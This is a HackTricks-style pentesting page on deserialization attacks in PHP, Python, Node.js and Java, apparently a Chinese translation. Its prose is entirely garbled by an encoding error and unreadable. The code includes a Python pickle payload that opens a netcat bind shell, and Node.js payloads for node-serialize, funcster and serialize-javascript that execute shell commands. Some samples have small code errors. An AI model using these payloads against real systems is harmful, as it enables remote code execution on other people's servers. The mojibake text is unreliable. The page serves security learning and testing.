# ååºåˆ—åŒ–

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºè‹±é›„</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š **å…³æ³¨** æˆ‘ä»¬ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
**åºåˆ—åŒ–** æ˜¯å°†æŸä¸ªå¯¹è±¡è½¬æ¢ä¸ºå¯ä»¥ç¨åæ¢å¤çš„æ•°æ®æ ¼å¼çš„è¿‡ç¨‹ã€‚äººä»¬ç»å¸¸åºåˆ—åŒ–å¯¹è±¡ä»¥ä¾¿å°†å®ƒä»¬ä¿å­˜åˆ°å­˜å‚¨ä¸­ï¼Œæˆ–ä½œä¸ºé€šä¿¡çš„ä¸€éƒ¨åˆ†å‘é€ã€‚

**ååºåˆ—åŒ–** æ˜¯è¯¥è¿‡ç¨‹çš„é€†è¿‡ç¨‹ï¼Œå®ƒå°†æŸç§æ ¼å¼çš„ç»“æ„åŒ–æ•°æ®é‡å»ºä¸ºå¯¹è±¡ã€‚å¦‚ä»Šï¼Œæœ€æµè¡Œçš„åºåˆ—åŒ–æ•°æ®æ ¼å¼æ˜¯JSONã€‚åœ¨æ­¤ä¹‹å‰ï¼Œæ˜¯XMLã€‚

åœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥åœ¨æœåŠ¡å™¨ç«¯æ‰¾åˆ°ä¸€äº›ååºåˆ—åŒ–ç”¨æˆ·æä¾›çš„æŸäº›å¯¹è±¡çš„ä»£ç ã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥å‘é€æ¶æ„æœ‰æ•ˆè½½è·ï¼Œä½¿æœåŠ¡å™¨ç«¯çš„è¡Œä¸ºå‡ºç°æ„å¤–ã€‚

**æ‚¨åº”è¯¥é˜…è¯»ï¼š** [**https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html) **äº†è§£å¦‚ä½•æ”»å‡»ã€‚**

## PHP

ä¸åºåˆ—åŒ–ä¸€èµ·ä½¿ç”¨çš„é­”æœ¯æ–¹æ³•ï¼š

* `__sleep` åœ¨å¯¹è±¡è¢«åºåˆ—åŒ–æ—¶è°ƒç”¨ï¼Œå¿…é¡»è¿”å›æ•°ç»„

ä¸ååºåˆ—åŒ–ä¸€èµ·ä½¿ç”¨çš„é­”æœ¯æ–¹æ³•

* `__wakeup` åœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶è°ƒç”¨ã€‚
* å¦‚æœå­˜åœ¨ï¼Œ`__unserialize` ä¼šä»£æ›¿ `__wakeup` è¢«è°ƒç”¨ã€‚
* `__destruct` åœ¨PHPè„šæœ¬ç»“æŸä¸”å¯¹è±¡è¢«é”€æ¯æ—¶è°ƒç”¨ã€‚
* `__toString` å°†å¯¹è±¡ç”¨ä½œå­—ç¬¦ä¸²ï¼Œä½†ä¹Ÿå¯ä»¥ç”¨æ¥è¯»å–æ–‡ä»¶æˆ–æ›´å¤šï¼Œè¿™å–å†³äºå…¶ä¸­çš„å‡½æ•°è°ƒç”¨ã€‚
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
å¦‚æœä½ æŸ¥çœ‹ç»“æœï¼Œä½ å¯ä»¥çœ‹åˆ°å½“å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶ï¼Œå‡½æ•° **`__wakeup`** å’Œ **`__destruct`** è¢«è°ƒç”¨ã€‚è¯·æ³¨æ„ï¼Œåœ¨å¤šä¸ªæ•™ç¨‹ä¸­ä½ ä¼šå‘ç°å½“å°è¯•æ‰“å°æŸä¸ªå±æ€§æ—¶ä¼šè°ƒç”¨ **`__toString`** å‡½æ•°ï¼Œä½†æ˜¾ç„¶è¿™**ä¸å†å‘ç”Ÿ**ã€‚

{% hint style="warning" %}
æ–¹æ³• **`__unserialize(array $data)`** ä¼šåœ¨ç±»ä¸­å®ç°æ—¶**ä»£æ›¿ `__wakeup()`** è¢«è°ƒç”¨ã€‚å®ƒå…è®¸ä½ é€šè¿‡æä¾›åºåˆ—åŒ–æ•°æ®ä½œä¸ºæ•°ç»„æ¥ååºåˆ—åŒ–å¯¹è±¡ã€‚ä½ å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–¹æ³•æ¥ååºåˆ—åŒ–å±æ€§å¹¶åœ¨ååºåˆ—åŒ–æ—¶æ‰§è¡Œä»»ä½•å¿…è¦çš„ä»»åŠ¡ã€‚
```php
phpCopy codeclass MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

æ‚¨å¯ä»¥é˜…è¯»ä¸€ä¸ªè§£é‡Šæ€§çš„ **PHP ç¤ºä¾‹**ï¼š[https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/)ï¼Œè¿™é‡Œ [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) æˆ–è¿™é‡Œ [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP ååºåˆ—åŒ– + è‡ªåŠ¨åŠ è½½ç±»

æ‚¨å¯ä»¥æ»¥ç”¨ PHP çš„è‡ªåŠ¨åŠ è½½åŠŸèƒ½æ¥åŠ è½½ä»»æ„ PHP æ–‡ä»¶ç­‰ï¼š

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### åºåˆ—åŒ–å¼•ç”¨å€¼

å¦‚æœå‡ºäºæŸç§åŸå› æ‚¨æƒ³å°†ä¸€ä¸ªå€¼åºåˆ—åŒ–ä¸º **å¯¹å¦ä¸€ä¸ªå·²åºåˆ—åŒ–å€¼çš„å¼•ç”¨**ï¼Œæ‚¨å¯ä»¥ï¼š
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (é€‚ç”¨äº PHP çš„ ysoserial)

[**PHPGGC**](https://github.com/ambionics/phpggc) å¯ä»¥å¸®åŠ©æ‚¨ç”Ÿæˆç”¨äºæ»¥ç”¨ PHP ååºåˆ—åŒ–çš„æœ‰æ•ˆè½½è·ã€‚\
è¯·æ³¨æ„ï¼Œåœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œæ‚¨**å¯èƒ½æ— æ³•åœ¨åº”ç”¨ç¨‹åºçš„æºä»£ç ä¸­æ‰¾åˆ°æ»¥ç”¨ååºåˆ—åŒ–çš„æ–¹æ³•**ï¼Œä½†æ‚¨å¯èƒ½èƒ½å¤Ÿ**æ»¥ç”¨å¤–éƒ¨ PHP æ‰©å±•çš„ä»£ç ã€‚**\
å› æ­¤ï¼Œå¦‚æœå¯èƒ½ï¼Œè¯·æ£€æŸ¥æœåŠ¡å™¨çš„ `phpinfo()` å¹¶åœ¨äº’è”ç½‘ä¸Šï¼ˆç”šè‡³åœ¨ **PHPGGC** çš„**å°å·¥å…·**ä¸­ï¼‰**æœç´¢**ä¸€äº›å¯èƒ½æ»¥ç”¨çš„å°å·¥å…·ã€‚

### phar:// å…ƒæ•°æ®ååºåˆ—åŒ–

å¦‚æœæ‚¨å‘ç°äº†ä¸€ä¸ª LFIï¼Œå®ƒåªæ˜¯è¯»å–æ–‡ä»¶è€Œä¸æ‰§è¡Œå…¶ä¸­çš„ php ä»£ç ï¼Œä¾‹å¦‚ä½¿ç”¨ _**file\_get\_contents(), fopen(), file() æˆ– file\_exists(), md5\_file(), filemtime() æˆ– filesize()**_**ã€‚** æ‚¨å¯ä»¥å°è¯•æ»¥ç”¨ä½¿ç”¨ **phar** åè®®**è¯»å–** **æ–‡ä»¶**æ—¶å‘ç”Ÿçš„**ååºåˆ—åŒ–**ã€‚\
æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·é˜…è¯»ä»¥ä¸‹å¸–å­ï¼š

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

å½“å¯¹è±¡è¢« unpickle æ—¶ï¼Œå‡½æ•° _\_\_reduce\_\__ å°†è¢«æ‰§è¡Œã€‚\
å½“è¢«åˆ©ç”¨æ—¶ï¼ŒæœåŠ¡å™¨å¯èƒ½ä¼šè¿”å›é”™è¯¯ã€‚
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
æœ‰å…³ä» **pickle ç›‘ç‹±** é€ƒè„±çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **å’Œ** jsonpickle

ä»¥ä¸‹é¡µé¢ä»‹ç»äº†å¦‚ä½•**æ»¥ç”¨ä¸å®‰å…¨çš„ yamls** Python åº“ä¸­çš„ååºåˆ—åŒ–æŠ€æœ¯ï¼Œå¹¶ä»¥ä¸€ä¸ªå¯ä»¥ç”¨äºç”Ÿæˆ **Pickle, PyYAML, jsonpickle å’Œ ruamel.yaml** çš„ RCE ååºåˆ—åŒ–æœ‰æ•ˆè½½è·çš„å·¥å…·ç»“æŸï¼š

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### ç±»æ±¡æŸ“ (Python åŸå‹æ±¡æŸ“)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JS é­”æœ¯å‡½æ•°

JS **æ²¡æœ‰åƒ PHP æˆ– Python é‚£æ ·çš„"é­”æœ¯"å‡½æ•°**ï¼Œè¿™äº›å‡½æ•°ä»…ä»…å› ä¸ºåˆ›å»ºäº†ä¸€ä¸ªå¯¹è±¡å°±ä¼šè¢«æ‰§è¡Œã€‚ä½†å®ƒæœ‰ä¸€äº›**å‡½æ•°**å³ä½¿æ²¡æœ‰ç›´æ¥è°ƒç”¨å®ƒä»¬ä¹Ÿ**ç»å¸¸ä½¿ç”¨**ï¼Œä¾‹å¦‚ **`toString`**, **`valueOf`**, **`toJSON`**ã€‚\
å¦‚æœæ»¥ç”¨ååºåˆ—åŒ–ï¼Œä½ å¯ä»¥**ç¯¡æ”¹è¿™äº›å‡½æ•°ä»¥æ‰§è¡Œå…¶ä»–ä»£ç **ï¼ˆå¯èƒ½æ»¥ç”¨åŸå‹æ±¡æŸ“ï¼‰ï¼Œå½“å®ƒä»¬è¢«è°ƒç”¨æ—¶ä½ å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

å¦ä¸€ç§**"é­”æœ¯"æ–¹å¼è°ƒç”¨å‡½æ•°**è€Œä¸ç›´æ¥è°ƒç”¨å®ƒæ˜¯é€šè¿‡**ç¯¡æ”¹ç”±å¼‚æ­¥å‡½æ•°**ï¼ˆpromiseï¼‰è¿”å›çš„å¯¹è±¡ã€‚å› ä¸ºï¼Œå¦‚æœä½ å°†é‚£ä¸ª**è¿”å›å¯¹è±¡**è½¬æ¢æˆå¦ä¸€ä¸ªå¸¦æœ‰åä¸º**"then" ç±»å‹ä¸ºå‡½æ•°**çš„**å±æ€§**çš„**promise**ï¼Œå®ƒå°†ä¼š**æ‰§è¡Œ**ï¼Œä»…ä»…å› ä¸ºå®ƒè¢«å¦ä¸€ä¸ª promise è¿”å›ã€‚_æ›´å¤šä¿¡æ¯è¯·_ [_**ç‚¹å‡»æ­¤é“¾æ¥**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/)ã€‚
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` å’Œ `prototype` æ±¡æŸ“

å¦‚æœä½ æƒ³å­¦ä¹ è¿™é¡¹æŠ€æœ¯**è¯·æŸ¥çœ‹ä»¥ä¸‹æ•™ç¨‹**ï¼š

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

è¿™ä¸ªåº“å…è®¸åºåˆ—åŒ–å‡½æ•°ã€‚ä¾‹å¦‚ï¼š
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
**åºåˆ—åŒ–å¯¹è±¡**å°†å¦‚ä¸‹æ‰€ç¤ºï¼š
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
æ‚¨å¯ä»¥åœ¨ç¤ºä¾‹ä¸­çœ‹åˆ°ï¼Œå½“å‡½æ•°è¢«åºåˆ—åŒ–æ—¶ï¼Œ`_$$ND_FUNC$$_` æ ‡å¿—ä¼šè¢«é™„åŠ åˆ°åºåˆ—åŒ–å¯¹è±¡ä¸Šã€‚

åœ¨æ–‡ä»¶ `node-serialize/lib/serialize.js` ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ç›¸åŒçš„æ ‡å¿—ä»¥åŠä»£ç å¦‚ä½•ä½¿ç”¨å®ƒã€‚

![](<../../.gitbook/assets/image (297).png>)

![](<../../.gitbook/assets/image (298).png>)

æ­£å¦‚æ‚¨åœ¨æœ€åä¸€æ®µä»£ç ä¸­çœ‹åˆ°çš„ï¼Œ**å¦‚æœæ‰¾åˆ°è¯¥æ ‡å¿—**ï¼Œ`eval` å°†è¢«ç”¨æ¥ååºåˆ—åŒ–å‡½æ•°ï¼Œæ‰€ä»¥åŸºæœ¬ä¸Š **ç”¨æˆ·è¾“å…¥è¢«ç”¨åœ¨äº† `eval` å‡½æ•°å†…**ã€‚

ç„¶è€Œï¼Œ**ä»…ä»…åºåˆ—åŒ–** å‡½æ•° **å¹¶ä¸ä¼šæ‰§è¡Œå®ƒ**ï¼Œå› ä¸ºåœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œéœ€è¦ä»£ç çš„æŸä¸ªéƒ¨åˆ†**è°ƒç”¨ `y.rce`**ï¼Œè¿™æ˜¯æä¸**å¯èƒ½**çš„ã€‚\
æ— è®ºå¦‚ä½•ï¼Œæ‚¨å¯ä»¥é€šè¿‡**ä¿®æ”¹åºåˆ—åŒ–å¯¹è±¡**ï¼Œ**æ·»åŠ ä¸€äº›æ‹¬å·**ï¼Œä»¥ä¾¿åœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶è‡ªåŠ¨æ‰§è¡Œåºåˆ—åŒ–çš„å‡½æ•°ã€‚\
åœ¨ä¸‹ä¸€æ®µä»£ç ä¸­**æ³¨æ„æœ€åçš„æ‹¬å·**ï¼Œä»¥åŠ `unserialize` å‡½æ•°å°†å¦‚ä½•è‡ªåŠ¨æ‰§è¡Œä»£ç ï¼š
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
å¦‚å‰æ‰€è¿°ï¼Œè¿™ä¸ªåº“ä¼šè·å–`_$$ND_FUNC$$_`åé¢çš„ä»£ç ï¼Œå¹¶ä½¿ç”¨`eval`**æ‰§è¡Œå®ƒ**ã€‚å› æ­¤ï¼Œä¸ºäº†**è‡ªåŠ¨æ‰§è¡Œä»£ç **ï¼Œä½ å¯ä»¥**åˆ é™¤å‡½æ•°åˆ›å»º**éƒ¨åˆ†å’Œæœ€åçš„æ‹¬å·ï¼Œ**åªæ‰§è¡Œä¸€ä¸ªJSå•è¡Œä»£ç **ï¼Œå¦‚ä¸‹ä¾‹æ‰€ç¤ºï¼š
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
ä½ å¯ä»¥åœ¨[**è¿™é‡Œ**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)æ‰¾åˆ°**æ›´å¤šä¿¡æ¯**å…³äºå¦‚ä½•åˆ©ç”¨è¿™ä¸ªæ¼æ´ã€‚

### [funcster](https://www.npmjs.com/package/funcster)

è¿™é‡Œæœ‰è¶£çš„ä¸åŒä¹‹å¤„åœ¨äºï¼Œ**æ ‡å‡†å†…ç½®å¯¹è±¡æ˜¯æ— æ³•è®¿é—®çš„**ï¼Œå› ä¸ºå®ƒä»¬è¶…å‡ºäº†ä½œç”¨åŸŸã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„ä»£ç ï¼Œä½†ä¸èƒ½è°ƒç”¨å†…ç½®å¯¹è±¡çš„æ–¹æ³•ã€‚æ‰€ä»¥å¦‚æœæˆ‘ä»¬ä½¿ç”¨`console.log()`æˆ–`require(something)`ï¼ŒNodeä¼šè¿”å›åƒ`"ReferenceError: console is not defined"`è¿™æ ·çš„å¼‚å¸¸ã€‚

ç„¶è€Œï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“åœ°é‡æ–°è·å¾—å¯¹ä¸€åˆ‡çš„è®¿é—®æƒé™ï¼Œå› ä¸ºæˆ‘ä»¬ä»ç„¶å¯ä»¥ä½¿ç”¨ç±»ä¼¼`this.constructor.constructor("console.log(1111)")();`çš„æ–¹æ³•è®¿é—®å…¨å±€ä¸Šä¸‹æ–‡ï¼š
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**æœ‰å…³**[**æ›´å¤šä¿¡æ¯ï¼Œè¯·é˜…è¯»æ­¤é¡µé¢**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**ã€‚**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

è¯¥åŒ…**ä¸åŒ…å«ä»»ä½•ååºåˆ—åŒ–åŠŸèƒ½**ï¼Œéœ€è¦æ‚¨è‡ªå·±å®ç°ã€‚ä»–ä»¬çš„ç¤ºä¾‹ç›´æ¥ä½¿ç”¨äº† `eval`ã€‚è¿™æ˜¯å®˜æ–¹çš„ååºåˆ—åŒ–ç¤ºä¾‹ï¼š
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
å¦‚æœè¿™ä¸ªå‡½æ•°è¢«ç”¨æ¥ååºåˆ—åŒ–å¯¹è±¡ï¼Œä½ å¯ä»¥**è½»æ¾åœ°åˆ©ç”¨å®ƒ**ï¼š
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
### Cryo åº“

åœ¨æ¥ä¸‹æ¥çš„é¡µé¢ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°æœ‰å…³å¦‚ä½•æ»¥ç”¨æ­¤åº“æ‰§è¡Œä»»æ„å‘½ä»¤çš„ä¿¡æ¯ï¼š

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

Java ä¸­ååºåˆ—åŒ–å¯¹è±¡çš„ä¸»è¦é—®é¢˜æ˜¯**åœ¨ååºåˆ—åŒ–æœŸé—´è°ƒç”¨äº†ååºåˆ—åŒ–å›è°ƒ**ã€‚è¿™ä½¿å¾—**æ”»å‡»è€…**å¯ä»¥**åˆ©ç”¨è¿™äº›å›è°ƒ**ï¼Œå‡†å¤‡ä¸€ä¸ªè´Ÿè½½ï¼Œæ»¥ç”¨å›è°ƒæ¥**æ‰§è¡Œæ¶æ„æ“ä½œ**ã€‚

### æŒ‡çº¹

#### ç™½ç›’

åœ¨ä»£ç ä¸­æœç´¢åºåˆ—åŒ–ç±»å’Œå‡½æ•°ã€‚ä¾‹å¦‚ï¼Œæœç´¢å®ç°äº† `Serializable` çš„ç±»ï¼Œä½¿ç”¨äº† `java.io.ObjectInputStream` \_\_ æˆ– `readObject` \_\_ æˆ– `readUnshare` å‡½æ•°\_.\_

æ‚¨è¿˜åº”è¯¥å…³æ³¨ï¼š

* å¸¦æœ‰å¤–éƒ¨ç”¨æˆ·å®šä¹‰å‚æ•°çš„ `XMLdecoder`
* å¸¦æœ‰ `fromXML` æ–¹æ³•çš„ `XStream`ï¼ˆxstream ç‰ˆæœ¬ <= v1.46 å¯¹åºåˆ—åŒ–é—®é¢˜æ˜“å—æ”»å‡»ï¼‰
* å¸¦æœ‰ `readObject` çš„ `ObjectInputStream`
* ä½¿ç”¨ `readObject`ã€`readObjectNodData`ã€`readResolve` æˆ– `readExternal`
* `ObjectInputStream.readUnshared`
* `Serializable`

#### é»‘ç›’

**æŒ‡çº¹/é­”æœ¯å­—èŠ‚** **java åºåˆ—åŒ–** å¯¹è±¡ï¼ˆæ¥è‡ª `ObjectInputStream`ï¼‰ï¼š

* åå…­è¿›åˆ¶ä¸­çš„ `AC ED 00 05`
* Base64 ä¸­çš„ `rO0`
* HTTP å“åº”çš„ `Content-type` å¤´è®¾ç½®ä¸º `application/x-java-serialized-object`
* å…ˆå‰å‹ç¼©çš„åå…­è¿›åˆ¶ `1F 8B 08 00`
* å…ˆå‰å‹ç¼©çš„ Base64 `H4sIA`
* å¸¦æœ‰æ‰©å±•å `.faces` å’Œå‚æ•° `faces.ViewState` çš„ Web æ–‡ä»¶ã€‚å¦‚æœæ‚¨åœ¨ webapp ä¸­æ‰¾åˆ°è¿™ä¸ªï¼Œè¯·æŸ¥çœ‹[**å…³äº Java JSF VewState ååºåˆ—åŒ–çš„å¸–å­**](java-jsf-viewstate-.faces-deserialization.md)ã€‚
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### æ£€æŸ¥æ˜¯å¦å­˜åœ¨æ¼æ´

å¦‚æœæ‚¨æƒ³**äº†è§£Javaååºåˆ—åŒ–æ¼æ´æ˜¯å¦‚ä½•å·¥ä½œçš„**ï¼Œæ‚¨åº”è¯¥æŸ¥çœ‹[**åŸºç¡€Javaååºåˆ—åŒ–**](basic-java-deserialization-objectinputstream-readobject.md)ã€[**Java DNSååºåˆ—åŒ–**](java-dns-deserialization-and-gadgetprobe.md)ä»¥åŠ[**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md)ã€‚

#### ç™½ç›’æµ‹è¯•

æ‚¨å¯ä»¥æ£€æŸ¥æ˜¯å¦å®‰è£…äº†ä»»ä½•å·²çŸ¥å­˜åœ¨æ¼æ´çš„åº”ç”¨ç¨‹åºã€‚
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
ä½ å¯ä»¥å°è¯•**æ£€æŸ¥æ‰€æœ‰å·²çŸ¥å­˜åœ¨æ¼æ´çš„åº“**ï¼Œä»¥åŠ[**Ysoserial**](https://github.com/frohoff/ysoserial)èƒ½å¤Ÿæä¾›æ¼æ´åˆ©ç”¨çš„åº“ã€‚æˆ–è€…ä½ å¯ä»¥æ£€æŸ¥åœ¨[Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json)ä¸ŠæŒ‡å‡ºçš„åº“ã€‚
ä½ è¿˜å¯ä»¥ä½¿ç”¨[**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector)æ¥æœç´¢å¯èƒ½çš„å¯åˆ©ç”¨çš„gadgeté“¾ã€‚
å½“è¿è¡Œ**gadgetinspector**ï¼ˆæ„å»ºåï¼‰æ—¶ï¼Œä¸ç”¨æ‹…å¿ƒå®ƒäº§ç”Ÿçš„å¤§é‡è­¦å‘Š/é”™è¯¯ï¼Œè®©å®ƒè¿è¡Œå®Œæ¯•ã€‚å®ƒä¼šå°†æ‰€æœ‰å‘ç°å†™å…¥_gadgetinspector/gadget-results/gadget-chains-year-month-day-hour-min.txt_ã€‚è¯·æ³¨æ„ï¼Œ**gadgetinspectorä¸ä¼šåˆ›å»ºæ¼æ´åˆ©ç”¨ä»£ç ï¼Œå®ƒå¯èƒ½ä¼šæŒ‡ç¤ºå‡ºå‡é˜³æ€§**ã€‚

#### é»‘ç›’æµ‹è¯•

ä½¿ç”¨Burpæ‰©å±•[**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md)ï¼Œä½ å¯ä»¥è¯†åˆ«**å“ªäº›åº“æ˜¯å¯ç”¨çš„**ï¼ˆç”šè‡³æ˜¯ç‰ˆæœ¬ï¼‰ã€‚æœ‰äº†è¿™äº›ä¿¡æ¯ï¼Œé€‰æ‹©ç”¨äºåˆ©ç”¨æ¼æ´çš„payloadå¯èƒ½ä¼š**æ›´å®¹æ˜“**ã€‚
[**é˜…è¯»è¿™é‡Œäº†è§£æ›´å¤šå…³äºGadgetProbeçš„ä¿¡æ¯**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**ã€‚**
GadgetProbeä¸“æ³¨äº**`ObjectInputStream`**çš„ååºåˆ—åŒ–**ã€‚**

ä½¿ç”¨Burpæ‰©å±•[**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)ï¼Œä½ å¯ä»¥**è¯†åˆ«æ˜“å—æ”»å‡»çš„åº“**ï¼Œè¿™äº›åº“å¯ä»¥ç”¨ysoserialæ¥**åˆ©ç”¨**ã€‚
[**é˜…è¯»è¿™é‡Œäº†è§£æ›´å¤šå…³äºJava Deserialization Scannerçš„ä¿¡æ¯ã€‚**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)
Java Deserialization Scannerä¸“æ³¨äº**`ObjectInputStream`**çš„ååºåˆ—åŒ–ã€‚

